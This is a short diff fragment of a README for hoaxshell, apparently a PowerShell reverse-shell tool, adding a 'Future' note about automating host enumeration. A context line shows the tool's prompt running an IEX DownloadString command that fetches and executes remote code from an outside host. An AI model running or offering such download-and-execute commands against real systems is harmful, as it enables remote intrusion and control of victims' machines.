@@ -73,3 +73,5 @@ hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:44
 ```
 Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.
 
+## Future
+I am currently working on some auxiliary-type prompt commands to automate parts of host enumeration.
